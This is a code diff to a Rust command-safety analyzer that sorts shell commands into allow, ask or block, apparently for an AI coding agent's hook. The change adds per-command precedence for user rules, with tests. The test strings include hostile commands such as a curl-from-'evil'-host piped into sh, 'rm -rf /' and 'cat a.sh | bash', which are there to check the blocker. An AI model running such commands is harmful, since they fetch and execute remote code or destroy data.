@@ -69,30 +69,86 @@
 //! the cap fails closed as `Ask` *before* even being parsed, exactly the
 //! same posture as [`crate::normalize::UnresolvableKind::ExpansionLimit`].
 //!
-//! # Allowlist wiring: deferred (plan.md §6 item 8's open question, resolved here)
+//! # User config precedence: deny > ask > allow (plan.md §6 item 8, resolved)
 //!
-//! `crate::rules::apply_allowlist` is **not** called from this pipeline.
-//! `Verdict::allow` carries no reason field (by design — an `Allow` is not
-//! an exception, it is the ordinary "resolved and clean" case), so a
-//! downgraded Ask->Allow verdict would have nowhere to surface its
-//! suppression id — and per `~/dotfiles/claude-code/rules/security.md`,
-//! "suppressions need an audit trail". Extending `Verdict` with an optional
-//! suppression note is a real option, but it changes the core-types
-//! contract (plan.md §1.2) for a feature whose only consumer today is the
-//! *embedded, ships-empty* allowlist — no operator can populate it yet
-//! (that channel is the hook adapter/composition-root issue). Wiring an
-//! audit-trail-losing downgrade now, to satisfy a file with zero entries,
-//! is exactly backwards: the reason channel should exist before the first
-//! real suppression can silently lose its trail. `apply_allowlist` stays
-//! exercised by its own unit tests (`crate::rules`) until the adapter issue
-//! adds the reason channel and wires this module to call it.
+//! `crate::rules::apply_allowlist` (an allowlist match downgrades `Ask` ->
+//! `Allow`, and is structurally Block-immune — its own first line rejects
+//! any non-`Ask` verdict before it even consults the allowlist) and a
+//! user-configured `ask` rule (`crate::rules::Rules::match_ask`, an `Allow`
+//! -> `Ask` floor) are both applied **per simple command**, inside
+//! [`evaluate_simple_command`], immediately after
+//! [`evaluate_simple_command_core`] produces that command's verdict — not
+//! once at the end of a multi-command line. Two reasons this placement is
+//! load-bearing, not just tidy:
+//!
+//! - [`fold_worst`] keeps the *earlier* verdict on a decision tie, so in
+//!   `"gh pr view; some-other-ask-worthy-command"` (both ending up `Ask`)
+//!   the line's folded top-level verdict carries `gh pr view`'s argv, not
+//!   the other command's. Downgrading only that final folded verdict would
+//!   find `gh pr view`'s allow entry and incorrectly suppress the whole
+//!   line's `Ask`, silencing the unrelated second command too.
+//! - Applying it per simple command, at every recursion level (this
+//!   module's substitution/`bash -c` recursion already threads `rules`
+//!   through every level, so `allowlist` costs nothing extra to thread the
+//!   same way), closes an ask-rule bypass a top-level-only check would
+//!   miss: `echo "$(gh api ...)"` and `bash -c 'gh api ...'` both execute
+//!   `gh`, but the top-level argv is `echo`/`bash`.
+//!
+//! **Order matters**: [`evaluate_simple_command`] applies the allowlist
+//! downgrade *before* the ask-floor. Applying them in the other order
+//! would make a config `allow` entry beat a config `ask` entry for a
+//! command matching both, which contradicts the fixed deny→ask→allow
+//! evaluation order (a broad `deny`/`ask` must never be overridable by a
+//! narrower `allow`, matching Claude Code's own `permissions.{deny,ask,
+//! allow}` precedence model). Verified case-by-case: `Block` is untouched
+//! by both steps (deny wins unconditionally, checked earlier inside
+//! `evaluate_simple_command_core`, and `apply_allowlist`'s own guard makes
+//! it Block-immune regardless of step order). A base `Allow` matching both
+//! an `ask` and an `allow` rule: the downgrade step no-ops (nothing to
+//! downgrade — it isn't `Ask` yet), then the ask-floor raises `Allow` ->
+//! `Ask`, so `Ask` wins. A structural `Ask` (e.g. an unresolvable
+//! construct) matching only an `allow` rule downgrades to `Allow`
+//! (`apply_allowlist`'s ordinary purpose, preserved). A structural `Ask`
+//! matching *both* an `ask` and an `allow` rule: downgrades to `Allow`,
+//! then the ask-floor re-raises it back to `Ask` — consistent, `ask` beats
+//! `allow` everywhere it matters.
+//!
+//! **A command with an argument-position command/backquote substitution
+//! (rule 3) is never eligible for the allow-downgrade step**, regardless
+//! of what [`evaluate_simple_command_core`] returns for it. `core`'s
+//! result can carry an `Ask`/`Block` that *propagated* from the recursed
+//! inner substitution's own analysis rather than from this command's own
+//! shape (rule 3's docs: "an inner Allow ... Ask/Block propagate"). With
+//! an `allow` entry for `command = "ls"`, `ls $($X)` (inner `$X`
+//! unresolvable) must stay `Ask` — the outer argv is `ls`, which the entry
+//! matches, but the uncertainty is about the *inner* substitution's
+//! unknown command, not about `ls` itself; downgrading here would permit
+//! executing an unresolved inner command under an allow entry that was
+//! never about it. [`has_any_argument_position_substitution`] is the
+//! (conservative — it excludes eligibility whenever a substitution is
+//! merely *present*, whether or not it resolves cleanly) guard for this.
+//! Two related recursion paths need no such guard: rule 1 (command-position
+//! substitution) can never match any allowlist entry at all, because
+//! `argv[0]` is unresolvable whenever rule 1 fires, and every
+//! `CommandRule` matcher requires a resolved command name; rule 6a
+//! (`bash -c '<string>'`) doesn't need it either, because the *outer*
+//! command in that case is literally one of `SHELL_INTERPRETERS`, and a
+//! config `allow` entry covering an interpreter name is rejected at
+//! config-load time (`crate::rules::UserConfig::parse`).
+//!
+//! The pipeline-shape `Ask`/`Block` (rule 5b/5c, folded in
+//! [`evaluate_pipeline`] — outside any single simple command's own
+//! verdict) is **not** allowlist-suppressible in v1: a deliberate,
+//! fail-closed scope cut, not an accident of where the wrap sits.
 
 use std::collections::HashMap;
 
 use crate::ast::{Assignment, CommandLine, Pipeline, SimpleCommand, Word, WordPiece};
 use crate::normalize::{self, NormalizedWord, Resolution, UnresolvableKind};
 use crate::parser;
-use crate::rules::{PIPELINE_INTERPRETERS, Rules, SHELL_INTERPRETERS};
+use crate::rules::{
+    Allowlist, AllowlistOutcome, CommandRule, PIPELINE_INTERPRETERS, Rules, SHELL_INTERPRETERS,
+};
 use crate::verdict::{Decision, Reason, Verdict};
 
 /// Cap on how many levels deep a command/backquote substitution (or a
@@ -122,14 +178,40 @@ pub(crate) fn analyze(command: &str) -> Verdict {
             );
         }
     };
-    analyze_at_depth(command, 0, &rules)
+    let allowlist = match Allowlist::embedded() {
+        Ok(allowlist) => allowlist,
+        Err(err) => {
+            return Verdict::ask(
+                Reason::new(format!(
+                    "the embedded allowlist failed to load ({err}); refusing to evaluate any command until this is fixed"
+                )),
+                Vec::new(),
+            );
+        }
+    };
+    analyze_at_depth(command, 0, &rules, &allowlist)
 }
 
-/// The recursive core of [`analyze`]: `depth` counts substitution-recursion
-/// levels (0 at the top call), and `rules` is loaded once by [`analyze`]
-/// and threaded through every recursive call so a deeply-nested command
-/// line never re-parses the blocklist TOML per level.
-fn analyze_at_depth(command: &str, depth: usize, rules: &Rules) -> Verdict {
+/// Config-aware sibling of [`analyze`]: same pipeline, but `rules`/
+/// `allowlist` are supplied by the caller (`crate::config::Policy`)
+/// instead of loaded from the embedded defaults. [`analyze`]'s own
+/// behavior is unaffected — it always loads `Rules::embedded()`/
+/// `Allowlist::embedded()` itself, never this function's arguments.
+///
+/// Unwired pending `crate::lib`'s own `analyze_with_policy`/`crate::config`
+/// (the very next commit) — hence `#[allow(dead_code)]` until then.
+#[allow(dead_code)]
+#[must_use]
+pub(crate) fn analyze_with_policy(command: &str, rules: &Rules, allowlist: &Allowlist) -> Verdict {
+    analyze_at_depth(command, 0, rules, allowlist)
+}
+
+/// The recursive core of [`analyze`]/[`analyze_with_policy`]: `depth`
+/// counts substitution-recursion levels (0 at the top call), and `rules`/
+/// `allowlist` are loaded once by the caller and threaded through every
+/// recursive call so a deeply-nested command line never re-parses the
+/// blocklist TOML per level.
+fn analyze_at_depth(command: &str, depth: usize, rules: &Rules, allowlist: &Allowlist) -> Verdict {
     if depth > MAX_SUBSTITUTION_DEPTH {
         return Verdict::ask(
             Reason::new(format!(
@@ -141,7 +223,7 @@ fn analyze_at_depth(command: &str, depth: usize, rules: &Rules) -> Verdict {
     }
 
     match parser::parse(command) {
-        Ok(command_line) => evaluate_command_line(&command_line, rules, depth),
+        Ok(command_line) => evaluate_command_line(&command_line, rules, allowlist, depth),
         Err(err) => Verdict::ask(
             Reason::new(format!("could not parse command: {err}")),
             Vec::new(),
@@ -156,11 +238,16 @@ fn analyze_at_depth(command: &str, depth: usize, rules: &Rules) -> Verdict {
 /// fresh per top-level/recursed command string, not shared across a
 /// substitution boundary (each recursion is its own self-contained command
 /// line).
-fn evaluate_command_line(command_line: &CommandLine, rules: &Rules, depth: usize) -> Verdict {
+fn evaluate_command_line(
+    command_line: &CommandLine,
+    rules: &Rules,
+    allowlist: &Allowlist,
+    depth: usize,
+) -> Verdict {
     let mut env = Env::new();
-    let mut worst = evaluate_pipeline(&command_line.first, &mut env, rules, depth);
+    let mut worst = evaluate_pipeline(&command_line.first, &mut env, rules, allowlist, depth);
     for (_separator, pipeline) in &command_line.rest {
-        let verdict = evaluate_pipeline(pipeline, &mut env, rules, depth);
+        let verdict = evaluate_pipeline(pipeline, &mut env, rules, allowlist, depth);
         worst = fold_worst(worst, verdict);
     }
     worst
@@ -169,7 +256,13 @@ fn evaluate_command_line(command_line: &CommandLine, rules: &Rules, depth: usize
 /// Folds every stage of a [`Pipeline`] plus the pipeline-shape rules (rule
 /// 5: the ported `curl|sh` blocklist rule and the NEW decode/interpreter
 /// structural rules) into one worst-decision-wins [`Verdict`].
-fn evaluate_pipeline(pipeline: &Pipeline, env: &mut Env, rules: &Rules, depth: usize) -> Verdict {
+fn evaluate_pipeline(
+    pipeline: &Pipeline,
+    env: &mut Env,
+    rules: &Rules,
+    allowlist: &Allowlist,
+    depth: usize,
+) -> Verdict {
     let mut stages = Vec::with_capacity(1 + pipeline.rest.len());
     stages.push(&pipeline.first);
     stages.extend(pipeline.rest.iter());
@@ -180,7 +273,7 @@ fn evaluate_pipeline(pipeline: &Pipeline, env: &mut Env, rules: &Rules, depth: u
 
     for command in stages {
         env.apply_assignments(command);
-        let verdict = evaluate_simple_command(command, env, rules, depth);
+        let verdict = evaluate_simple_command(command, env, rules, allowlist, depth);
         stage_argvs.push(verdict.normalized_argv().to_vec());
         worst = if have_worst {
             fold_worst(worst, verdict)
@@ -249,19 +342,100 @@ fn evaluate_pipeline_shape(stages: &[Vec<NormalizedWord>]) -> Option<Verdict> {
     }
 }
 
-/// Evaluates one [`SimpleCommand`] against every per-command gate rule (1,
-/// 2, 4, 6, 7, 8, 9 — rule 3's recursion lives here too) plus the ordinary
-/// blocklist match (stage 3, `crate::rules::Rules::match_command`). `env`
-/// must already have this command's own prefix assignments merged in by
-/// the caller (`Env::apply_assignments`) before this is called.
+/// Whether `command`'s argument words (everything after the first
+/// non-empty word — the same forward scan
+/// [`evaluate_simple_command_core`] performs to locate `argument_words`)
+/// contain any argument-position command/backquote substitution (rule 3).
+/// Computed independently of, and before, running the full rule set, so
+/// [`evaluate_simple_command`] can decide allow-downgrade eligibility —
+/// see the module docs on why a command with an argument-position
+/// substitution is never eligible.
+fn has_any_argument_position_substitution(command: &SimpleCommand) -> bool {
+    let Some(first_word_idx) = command
+        .words
+        .iter()
+        .position(|word| !normalize::normalize_word(word).is_empty())
+    else {
+        return false;
+    };
+    command.words[first_word_idx + 1..]
+        .iter()
+        .any(|word| !collect_substitutions(word).is_empty())
+}
+
+/// Applies a user-configured allowlist match to `verdict`: `Ask` -> `Allow`
+/// only, via the existing Block-immune `crate::rules::apply_allowlist` — a
+/// `Block` verdict is untouched by that function's own first guard clause,
+/// and an `Allow` verdict has nothing to downgrade from.
+fn apply_allowlist_downgrade(verdict: Verdict, allowlist: &Allowlist) -> Verdict {
+    match crate::rules::apply_allowlist(&verdict, allowlist) {
+        AllowlistOutcome::Unchanged => verdict,
+        AllowlistOutcome::Downgraded {
+            suppressed_by,
+            reason,
+        } => Verdict::allow_suppressed(verdict.normalized_argv().to_vec(), suppressed_by, reason),
+    }
+}
+
+/// Applies a user-configured `ask` rule match to `verdict`: `Allow` ->
+/// `Ask` only. A command that is already `Ask`/`Block` for its own reasons
+/// keeps that reason — an ask-rule match never replaces it, only ever
+/// raises a plain `Allow`.
+fn apply_ask_floor(verdict: Verdict, ask_match: Option<&CommandRule>) -> Verdict {
+    match (verdict.decision(), ask_match) {
+        (Decision::Allow, Some(rule)) => Verdict::ask(
+            Reason::new(format!(
+                "matches user-configured ask rule {:?}: {}",
+                rule.id().as_str(),
+                rule.reason().as_str()
+            )),
+            verdict.normalized_argv().to_vec(),
+        ),
+        _ => verdict,
+    }
+}
+
+/// Evaluates one [`SimpleCommand`]: [`evaluate_simple_command_core`]'s
+/// per-command gate rules and blocklist match, then the user-config
+/// allowlist-downgrade and ask-floor steps (module docs, "User config
+/// precedence: deny > ask > allow" — order and the argument-substitution
+/// eligibility guard both matter, see there). `env` must already have this
+/// command's own prefix assignments merged in by the caller
+/// (`Env::apply_assignments`) before this is called.
 fn evaluate_simple_command(
     command: &SimpleCommand,
     env: &Env,
     rules: &Rules,
+    allowlist: &Allowlist,
     depth: usize,
 ) -> Verdict {
     let argv = normalize::normalize_argv(command);
+    let ask_match = rules.match_ask(&argv);
+    let has_argument_substitution = has_any_argument_position_substitution(command);
 
+    let verdict = evaluate_simple_command_core(command, argv, env, rules, allowlist, depth);
+
+    let verdict = if has_argument_substitution {
+        verdict
+    } else {
+        apply_allowlist_downgrade(verdict, allowlist)
+    };
+    apply_ask_floor(verdict, ask_match)
+}
+
+/// Evaluates one [`SimpleCommand`] against every per-command gate rule (1,
+/// 2, 4, 6, 7, 8, 9 — rule 3's recursion lives here too) plus the ordinary
+/// blocklist match (stage 3, `crate::rules::Rules::match_command`). `argv`
+/// is the command's already-normalised argv, computed once by
+/// [`evaluate_simple_command`] and passed in rather than recomputed here.
+fn evaluate_simple_command_core(
+    command: &SimpleCommand,
+    argv: Vec<NormalizedWord>,
+    env: &Env,
+    rules: &Rules,
+    allowlist: &Allowlist,
+    depth: usize,
+) -> Verdict {
     // Rule 9: assignments-only / empty / redirection-only commands do
     // nothing dangerous themselves. This also covers the edge case of a
     // command consisting only of a leading, unquoted `$IFS`-only word
@@ -294,7 +468,13 @@ fn evaluate_simple_command(
     // Rule 1: command-position `$()`/backtick.
     let command_position_subs = collect_substitutions(first_word_ast);
     if !command_position_subs.is_empty() {
-        return evaluate_command_position_substitution(&command_position_subs, argv, rules, depth);
+        return evaluate_command_position_substitution(
+            &command_position_subs,
+            argv,
+            rules,
+            allowlist,
+            depth,
+        );
     }
 
     // Rule 2 / rule 8 (command-position half): argv[0] unresolvable for any
@@ -318,7 +498,7 @@ fn evaluate_simple_command(
     // Rule 6a: `bash -c '<string>'`/`sh -c`/`zsh -c`/`dash -c` recurses the
     // script exactly like a substitution.
     if SHELL_INTERPRETERS.contains(&command_name.as_str())
-        && let Some(outcome) = evaluate_dash_c(&argv, &command_name, rules, depth)
+        && let Some(outcome) = evaluate_dash_c(&argv, &command_name, rules, allowlist, depth)
     {
         return outcome;
     }
@@ -340,7 +520,8 @@ fn evaluate_simple_command(
 
     // Rule 3: argument-position `$()`/backtick recursion. An inner Allow
     // never forces the outer command non-Allow; Ask/Block propagate.
-    let substitution_result = evaluate_argument_substitutions(argument_words, depth, rules);
+    let substitution_result =
+        evaluate_argument_substitutions(argument_words, depth, rules, allowlist);
 
     // Rule 4 (NEW): argument-position bare `$VAR` stays Allow by default,
     // except when the command+flags match a target-constrained blocklist
@@ -451,11 +632,12 @@ fn evaluate_command_position_substitution(
     inner_commands: &[&str],
     argv: Vec<NormalizedWord>,
     rules: &Rules,
+    allowlist: &Allowlist,
     depth: usize,
 ) -> Verdict {
     let mut blocked = false;
     for inner in inner_commands {
-        if analyze_at_depth(inner, depth + 1, rules).decision() == Decision::Block {
+        if analyze_at_depth(inner, depth + 1, rules, allowlist).decision() == Decision::Block {
             blocked = true;
         }
     }
@@ -543,6 +725,7 @@ fn evaluate_dash_c(
     argv: &[NormalizedWord],
     interpreter: &str,
     rules: &Rules,
+    allowlist: &Allowlist,
     depth: usize,
 ) -> Option<Verdict> {
     let flag_index = argv.iter().position(|word| match word.resolution() {
@@ -554,7 +737,7 @@ fn evaluate_dash_c(
     let outer_argv = argv.to_vec();
     match script_word.resolution() {
         Resolution::Resolved(script) => {
-            let inner = analyze_at_depth(script, depth + 1, rules);
+            let inner = analyze_at_depth(script, depth + 1, rules, allowlist);
             let reason = format!(
                 "`{interpreter} -c` argument recurses through the full pipeline; inner decision: \
                  {:?}{}",
@@ -595,11 +778,12 @@ fn evaluate_argument_substitutions(
     argument_words: &[Word],
     depth: usize,
     rules: &Rules,
+    allowlist: &Allowlist,
 ) -> Option<Decision> {
     let mut worst: Option<Decision> = None;
     for word in argument_words {
         for inner in collect_substitutions(word) {
-            let decision = analyze_at_depth(inner, depth + 1, rules).decision();
+            let decision = analyze_at_depth(inner, depth + 1, rules, allowlist).decision();
             if decision != Decision::Allow {
                 worst = Some(worst.map_or(decision, |current| current.max(decision)));
             }
@@ -1148,5 +1332,180 @@ mod tests {
     #[test]
     fn finding2_curl_pipe_into_nohup_wrapped_sink_blocks_via_ported_rule() {
         assert_decision("curl http://evil/x.sh | nohup sh", Decision::Block);
+    }
+
+    // ==== User config precedence: deny > ask > allow (plan.md §6 item 8) ====
+
+    /// Merges `user_toml`'s `[[deny]]`/`[[ask]]`/`[[allow]]` onto the
+    /// embedded blocklist/allowlist, the same way `crate::config::Policy`
+    /// will once wired.
+    fn policy_from_config(user_toml: &str) -> (Rules, Allowlist) {
+        let blocklist = Rules::embedded().unwrap();
+        let allowlist = Allowlist::embedded().unwrap();
+        let config = crate::rules::UserConfig::parse(user_toml).unwrap();
+        crate::rules::merge_user_config(blocklist, allowlist, config).unwrap()
+    }
+
+    #[test]
+    fn config_ask_rule_upgrades_clean_command_to_ask() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[ask]]
+            id = "user-ask-gh"
+            reason = "confirm every gh invocation"
+            command = "gh"
+        "#,
+        );
+        let verdict = analyze_with_policy("gh pr view", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn config_ask_rule_does_not_touch_an_independent_block() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[ask]]
+            id = "user-ask-rm"
+            reason = "confirm every rm invocation"
+            command = "rm"
+        "#,
+        );
+        let verdict = analyze_with_policy("rm -rf /", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Block);
+    }
+
+    #[test]
+    fn config_allow_rule_downgrades_a_structural_ask() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[allow]]
+            id = "user-allow-rm"
+            reason = "trust me"
+            command = "rm"
+        "#,
+        );
+        // rm -rf $HOME: rule 4's except-target refinement, a genuine
+        // per-command structural Ask with a resolved command name — the
+        // ordinary case apply_allowlist exists to handle.
+        let verdict = analyze_with_policy("rm -rf $HOME", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Allow);
+    }
+
+    #[test]
+    fn config_ask_beats_allow_when_both_match_the_same_command() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[ask]]
+            id = "user-ask-gh"
+            reason = "confirm"
+            command = "gh"
+
+            [[allow]]
+            id = "user-allow-gh"
+            reason = "trust me"
+            command = "gh"
+        "#,
+        );
+        let verdict = analyze_with_policy("gh pr view", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn config_allow_cannot_downgrade_block_end_to_end() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[allow]]
+            id = "user-allow-rm"
+            reason = "trust me"
+            command = "rm"
+        "#,
+        );
+        let verdict = analyze_with_policy("rm -rf /", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Block);
+    }
+
+    #[test]
+    fn config_downgrade_isolated_per_command_in_compound_line() {
+        // "rm -rf $HOME" is individually downgradable to Allow (structural
+        // Ask + a matching allow rule); "python3 -c '...'" is
+        // independently Ask for an unrelated reason (rule 6b), with no
+        // rule mentioning it at all. If the allowlist downgrade were
+        // applied once to the whole line's folded verdict instead of per
+        // simple command, the decision tie between the two Asks would let
+        // fold_worst's "keep the earlier verdict" rule surface rm's argv,
+        // which the allow entry would then incorrectly match — silently
+        // allowing the entire line, including the unrelated python3
+        // command. Per-command application (this module's actual design)
+        // resolves rm's Ask to Allow *before* folding, so the line's
+        // overall decision comes from python3 alone.
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[allow]]
+            id = "user-allow-rm"
+            reason = "trust me"
+            command = "rm"
+        "#,
+        );
+        let verdict = analyze_with_policy("rm -rf $HOME; python3 -c 'x'", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn config_allow_does_not_downgrade_ask_propagated_from_argument_substitution() {
+        // The required regression case: an allow entry for "ls" must not
+        // downgrade "ls $($X)" just because the outer command is ls — the
+        // Ask here is about the inner, unresolvable substitution, not
+        // about ls itself.
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[allow]]
+            id = "user-allow-ls"
+            reason = "trust me"
+            command = "ls"
+        "#,
+        );
+        let verdict = analyze_with_policy("ls $($X)", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn config_deny_rule_recurses_into_bash_dash_c() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[deny]]
+            id = "user-deny-gh"
+            reason = "never run gh"
+            command = "gh"
+        "#,
+        );
+        let verdict = analyze_with_policy("bash -c 'gh repo delete'", &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Block);
+    }
+
+    #[test]
+    fn config_ask_rule_recurses_into_argument_position_substitution() {
+        let (rules, allowlist) = policy_from_config(
+            r#"
+            [[ask]]
+            id = "user-ask-gh"
+            reason = "confirm"
+            command = "gh"
+        "#,
+        );
+        let verdict = analyze_with_policy(r#"echo "$(gh pr view)""#, &rules, &allowlist);
+        assert_eq!(verdict.decision(), Decision::Ask);
+    }
+
+    #[test]
+    fn analyze_with_policy_matches_analyze_when_policy_is_embedded_only() {
+        let rules = Rules::embedded().unwrap();
+        let allowlist = Allowlist::embedded().unwrap();
+        for command in ["rm -rf /", "echo hi", "gh pr view", "cat a.sh | bash"] {
+            assert_eq!(
+                analyze(command).decision(),
+                analyze_with_policy(command, &rules, &allowlist).decision(),
+                "{command:?}"
+            );
+        }
     }
 }
